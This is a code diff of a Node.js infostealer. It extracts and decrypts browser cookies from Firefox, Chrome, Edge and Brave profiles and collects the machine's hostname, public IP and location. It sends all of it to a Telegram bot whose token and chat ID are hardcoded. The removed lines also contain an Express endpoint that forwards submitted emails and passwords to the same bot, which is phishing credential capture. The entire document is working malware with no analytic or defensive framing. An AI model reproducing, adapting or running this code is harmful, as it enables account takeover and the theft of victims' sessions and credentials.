@@ -1,274 +1,201 @@
-// ------------------------- MODULES -------------------------
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const sqlite3 = require('sqlite3').verbose();
-const crypto = require('crypto');
-const keytar = require('keytar');
-const fetch = require('node-fetch');
-const FormData = require('form-data');
+const fetch = require('node-fetch'); // npm install node-fetch@2
+const FormData = require('form-data'); // npm install form-data
+const dpapi = require('dpapi'); // npm install dpapi
+const glob = require('glob'); // npm install glob
 
-// Safe express declaration
-let express;
-try {
-    express = require.cache[require.resolve('express')]?.exports || require('express');
-} catch {
-    express = require('express');
-}
-
-// Safe body-parser declaration
-let bodyParser;
-try {
-    bodyParser = require.cache[require.resolve('body-parser')]?.exports || require('body-parser');
-} catch {
-    bodyParser = require('body-parser');
-}
-
-// ------------------------- CONFIG -------------------------
-const OUTPUT_FILE = 'cookies.json';
+// Telegram Config
 const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
 const TELEGRAM_CHAT_ID = "7574749243";
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 const TELEGRAM_FILE_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+const OUTPUT_FILE = 'cookies.json';
 
-// ------------------------- DEBUG UTILITY -------------------------
-function debugLog(msg) { console.log(`[DEBUG] ${msg}`); }
+// Browser paths
+const BROWSER_PATHS = {
+    "Chrome": path.join(os.homedir(), "AppData", "Local", "Google", "Chrome", "User Data"),
+    "Edge": path.join(os.homedir(), "AppData", "Local", "Microsoft", "Edge", "User Data"),
+    "Brave": path.join(os.homedir(), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+};
 
-// ------------------------- SERVER -------------------------
-const app = express();
-app.use(bodyParser.json());
-app.use(express.static('public')); // serve HTML + JS in public folder
-
-app.post('/send-message', async (req, res) => {
-    const { email, password } = req.body;
-    console.log("Received from frontend:", email, password);
-
-    const text = `💻 User submitted:\nEmail: ${email}\nPassword: ${password}`;
-    try {
-        await fetch(TELEGRAM_API_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
-        });
-    } catch (err) {
-        console.log("❌ Telegram send failed:", err);
-    }
-
-    res.json({ success: true });
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
-
-// ------------------------- WINDOWS-ONLY MODULE -------------------------
-let dpapi;
-if (process.platform === 'win32') {
-    try {
-        dpapi = require('win-dpapi');
-    } catch (e) {
-        console.log('[DEBUG] win-dpapi not installed or cannot load on this platform.');
-    }
+// Debug log
+function debugLog(msg) {
+    console.log(`[DEBUG] ${msg}`);
 }
 
-// ------------------------- HELPER FUNCTIONS -------------------------
+// Convert Chrome/Firefox expiry
 function parseExpiry(expiry) {
     const value = parseInt(expiry, 10);
     return isNaN(value) ? null : value;
 }
 
-function parseChromiumExpiry(expires_utc) {
-    const epoch = new Date('1601-01-01T00:00:00Z').getTime();
-    return Math.floor(epoch / 1000 + expires_utc / 1000000);
+// Decrypt Chromium cookie
+function decryptChromiumCookie(encryptedValue) {
+    if (!encryptedValue || encryptedValue.length === 0) return null;
+
+    // Remove "v10" prefix if present
+    if (Buffer.isBuffer(encryptedValue) && encryptedValue.slice(0, 3).toString() === 'v10') {
+        encryptedValue = encryptedValue.slice(3);
+    }
+
+    try {
+        return dpapi.unprotectData(encryptedValue, null, 'CurrentUser').toString('utf-8');
+    } catch (err) {
+        debugLog(`❌ Failed to decrypt Chromium cookie: ${err}`);
+        return null;
+    }
 }
 
-// ------------------------- FIREFOX COOKIE EXTRACTION (ASYNC) -------------------------
-async function extractFirefoxCookies() {
+// Extract Firefox cookies
+function extractFirefoxCookies() {
     const cookiesList = [];
-    const profilesPath = process.platform === 'win32'
-        ? path.join(os.homedir(), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
-        : path.join(os.homedir(), 'Library', 'Application Support', 'Firefox', 'Profiles');
+    const firefoxProfilesPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');
 
-    if (!fs.existsSync(profilesPath)) return cookiesList;
+    if (!fs.existsSync(firefoxProfilesPath)) return cookiesList;
 
-    const profiles = fs.readdirSync(profilesPath);
-    for (const profile of profiles) {
-        const dbPath = path.join(profilesPath, profile, 'cookies.sqlite');
-        if (!fs.existsSync(dbPath)) continue;
+    const profiles = fs.readdirSync(firefoxProfilesPath);
+    profiles.forEach(profile => {
+        const dbPath = path.join(firefoxProfilesPath, profile, 'cookies.sqlite');
+        if (!fs.existsSync(dbPath)) return;
 
         const db = new sqlite3.Database(dbPath, sqlite3.OPEN_READONLY);
-
-        const rows = await new Promise((resolve, reject) => {
-            db.all(
-                `SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies`,
-                (err, rows) => {
-                    if (err) reject(err);
-                    else resolve(rows || []);
-                }
-            );
-        });
-
-        for (const r of rows) {
-            cookiesList.push({
-                domain: r.host,
-                name: r.name,
-                value: r.value,
-                path: r.path || '/',
-                expires: parseExpiry(r.expiry),
-                httpOnly: !!r.isHttpOnly,
-                secure: !!r.isSecure
+        db.serialize(() => {
+            db.all(`SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies`, (err, rows) => {
+                if (err) return;
+                rows.forEach(row => {
+                    cookiesList.push({
+                        domain: row.host,
+                        name: row.name,
+                        value: row.value,
+                        path: row.path || '/',
+                        expires: parseExpiry(row.expiry),
+                        secure: !!row.isSecure,
+                        httpOnly: !!row.isHttpOnly
+                    });
+                });
             });
-        }
-
+        });
         db.close();
-    }
+    });
 
     return cookiesList;
 }
 
-// ------------------------- CHROMIUM COOKIE EXTRACTION -------------------------
-const BROWSER_PATHS = process.platform === 'win32'
-    ? {
-        Chrome: path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
-        Edge: path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
-        Brave: path.join(os.homedir(), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
-        Opera: path.join(os.homedir(), 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
-    }
-    : {
-        Chrome: path.join(os.homedir(), 'Library', 'Application Support', 'Google', 'Chrome'),
-        Edge: path.join(os.homedir(), 'Library', 'Application Support', 'Microsoft Edge'),
-        Brave: path.join(os.homedir(), 'Library', 'Application Support', 'BraveSoftware', 'Brave-Browser'),
-        Opera: path.join(os.homedir(), 'Library', 'Application Support', 'com.operasoftware.Opera'),
-    };
-
-async function decryptChromiumCookie(encryptedValue, browser) {
-    try {
-        if (!encryptedValue || encryptedValue.length === 0) return '';
-
-        // Windows DPAPI
-        if (process.platform === 'win32') {
-            if (dpapi) {
-                return await new Promise((resolve) => {
-                    try {
-                        const decrypted = dpapi.unprotectData(encryptedValue, null, 'CurrentUser');
-                        resolve(decrypted.toString('utf-8'));
-                    } catch (e) {
-                        debugLog(`❌ DPAPI decryption failed: ${e}`);
-                        resolve('');
-                    }
-                });
-            }
-            return '';
-        }
-
-        // Mac / Linux AES decryption
-        const password = await keytar.getPassword('Chrome Safe Storage', browser) || 'peanuts';
-        const key = crypto.createHash('sha1').update(password).digest().slice(0, 16);
-        const iv = Buffer.alloc(16, 0);
-
-        const prefix = encryptedValue.slice(0, 3).toString();
-        if (prefix === 'v10' || prefix === 'v11') {
-            const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
-            return Buffer.concat([decipher.update(encryptedValue.slice(3)), decipher.final()]).toString();
-        }
-
-        return encryptedValue.toString();
-    } catch (e) {
-        debugLog(`❌ Failed to decrypt cookie: ${e}`);
-        return '';
-    }
-}
-
-async function extractChromiumCookies() {
+// Extract Chromium cookies
+function extractChromiumCookies() {
     const cookiesList = [];
 
     for (const [browser, basePath] of Object.entries(BROWSER_PATHS)) {
-        if (!fs.existsSync(basePath)) continue;
+        const expandedPaths = basePath.includes('*') ? glob.sync(basePath) : [basePath];
 
-        const profiles = fs.readdirSync(basePath)
-            .filter(f => {
-                const fullPath = path.join(basePath, f);
-                return fs.existsSync(fullPath) && fs.statSync(fullPath).isDirectory() &&
-                    fs.existsSync(path.join(fullPath, 'Cookies'));
-            });
+        expandedPaths.forEach(browserPath => {
+            if (!fs.existsSync(browserPath)) return;
 
-        for (const profile of profiles) {
-            const cookiePath = path.join(basePath, profile, 'Cookies');
-            if (!fs.existsSync(cookiePath)) continue;
+            const profileFolders = fs.readdirSync(browserPath).filter(f =>
+                fs.statSync(path.join(browserPath, f)).isDirectory()
+            );
 
-            const db = new sqlite3.Database(cookiePath, sqlite3.OPEN_READONLY);
-            const rows = await new Promise((resolve, reject) => {
-                db.all(
-                    `SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies`,
-                    (err, rows) => {
-                        if (err) reject(err);
-                        else resolve(rows || []);
-                    }
-                );
-            });
+            profileFolders.forEach(profile => {
+                const cookiePath = path.join(browserPath, profile, 'Cookies');
+                if (!fs.existsSync(cookiePath)) return;
 
-            for (const r of rows) {
-                const value = await decryptChromiumCookie(r.encrypted_value, browser);
-                cookiesList.push({
-                    domain: r.host_key,
-                    name: r.name,
-                    value,
-                    path: r.path || '/',
-                    expires: parseChromiumExpiry(r.expires_utc),
-                    httpOnly: !!r.is_httponly,
-                    secure: !!r.is_secure
+                const db = new sqlite3.Database(cookiePath, sqlite3.OPEN_READONLY);
+                db.serialize(() => {
+                    db.all(`SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies`, (err, rows) => {
+                        if (err) return;
+                        rows.forEach(row => {
+                            const decryptedValue = decryptChromiumCookie(row.encrypted_value);
+                            cookiesList.push({
+                                domain: row.host_key,
+                                name: row.name,
+                                value: decryptedValue,
+                                path: row.path || '/',
+                                expires: parseExpiry(row.expires_utc),
+                                secure: !!row.is_secure,
+                                httpOnly: !!row.is_httponly
+                            });
+                        });
+                    });
                 });
-            }
-
-            db.close();
-        }
+                db.close();
+            });
+        });
     }
 
     return cookiesList;
 }
 
-// ------------------------- SAVE & SEND COOKIES -------------------------
-async function saveAndSendCookies() {
-    const firefoxCookies = await extractFirefoxCookies();
-    const chromiumCookies = await extractChromiumCookies();
-    const cookies = firefoxCookies.concat(chromiumCookies);
-
-    if (!cookies.length) {
-        debugLog("⚠️ No cookies found");
-        return;
-    }
-
-    fs.writeFileSync(OUTPUT_FILE, JSON.stringify(cookies, null, 4));
-    debugLog(`✅ Cookies saved to ${OUTPUT_FILE}`);
-
-    const systemInfo = `🖥 Computer Name: ${os.hostname()}`;
-    await fetch(TELEGRAM_API_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: systemInfo })
-    });
-
-    const fileStream = fs.createReadStream(OUTPUT_FILE);
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('document', fileStream);
-
+// Get system info
+async function getSystemInfo() {
     try {
-        const res = await fetch(TELEGRAM_FILE_URL, { method: 'POST', body: formData });
-        debugLog(res.ok ? "✅ Cookies sent to Telegram!" : "❌ Failed to send cookies");
+        const computerName = os.hostname();
+        const ipRes = await fetch('https://api64.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const ipAddress = ipData.ip || 'Unknown';
+        const locRes = await fetch(`https://ipinfo.io/${ipAddress}/json`);
+        const locData = await locRes.json();
+        const location = `${locData.city || 'Unknown'}, ${locData.country || 'Unknown'}`;
+        return `🖥 Computer: ${computerName}\n🌐 IP: ${ipAddress}\n📍 Location: ${location}`;
     } catch (err) {
-        debugLog(`❌ Error sending cookies: ${err}`);
+        return '⚠️ Could not retrieve system details.';
     }
 }
 
-// ------------------------- RUN -------------------------
-(async () => {
-    debugLog("Testing Telegram bot connectivity...");
-    const testRes = await fetch(TELEGRAM_API_URL, {
+// Test Telegram
+async function testTelegram() {
+    try {
+        const res = await fetch(TELEGRAM_API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: "Test: Telegram bot is connected!" })
+        });
+        if (res.ok) debugLog("✅ Telegram bot connected!");
+        else debugLog(`❌ Telegram test failed: ${await res.text()}`);
+    } catch (err) {
+        debugLog(`❌ Telegram test error: ${err}`);
+    }
+}
+
+// Save cookies and send to Telegram
+async function saveAndSendCookies() {
+    const cookies = extractFirefoxCookies().concat(extractChromiumCookies());
+
+    if (!cookies.length) {
+        debugLog("⚠️ No cookies extracted.");
+        return;
+    }
+
+    fs.writeFileSync(OUTPUT_FILE, JSON.stringify(cookies, null, 4), { encoding: 'utf-8' });
+    debugLog(`✅ Cookies saved to ${OUTPUT_FILE}`);
+
+    // Send system info
+    const sysInfo = await getSystemInfo();
+    await fetch(TELEGRAM_API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: "Telegram bot is connected!" })
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: sysInfo })
     });
-    debugLog(testRes.ok ? "✅ Telegram test message sent!" : "❌ Telegram test failed");
 
+    // Send JSON file
+    const fileStream = fs.createReadStream(OUTPUT_FILE);
+    const form = new FormData();
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('document', fileStream);
+
+    try {
+        const response = await fetch(TELEGRAM_FILE_URL, { method: 'POST', body: form });
+        if (response.ok) debugLog("✅ Cookies sent to Telegram!");
+        else debugLog(`❌ Telegram error: ${await response.text()}`);
+    } catch (err) {
+        debugLog(`❌ Error sending cookies file: ${err}`);
+    }
+}
+
+// Run
+(async () => {
+    await testTelegram();
     await saveAndSendCookies();
 })();
